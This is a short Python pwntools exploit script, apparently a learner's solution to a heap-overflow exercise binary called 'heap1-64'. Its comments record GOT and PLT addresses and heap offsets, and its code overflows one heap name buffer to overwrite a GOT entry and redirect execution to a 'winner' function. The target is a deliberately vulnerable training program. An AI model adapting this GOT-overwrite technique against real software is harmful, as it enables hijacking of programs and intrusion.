from pwn import *
import sys

#addr of i1 0x7fffffffe0c8
#addr of i1.name = 0x602018
#addr of i2.name = 0x602058

#space between i1.name and i2.name = 0x38; 56 in dec

#addr of puts 0x400550
#addr of printf 0x400560
#puts jmps to 0x601020 ; has \x20 which is a space char; 
#can't have space char for some reason, need to find something else
#printf jmps to 0x601028

#time function called in winner function; i think we want to replace overwrite_addr with time_addr
#addr of time 0x400580
#time jmps to 0x601038


#addr of puts in libc 0xf7a7c690
#addr of strcpy@plt 0x400540
#addr of strcpy in libc 0xf7ab29d0
#strcpy jumps to 0x601018
padding = 'a'*0x28

overwrite_addr = p64(0x0000000060101f)

win_addr = p64(0x400697)
win_str = 'a' + win_addr
exploit_str = padding + overwrite_addr


#sys.stdout.write(win_str)


#p = process(['step1', 'arg1', 'arg2'])
p = process(["./heap1-64",exploit_str,win_addr])
p.wait()
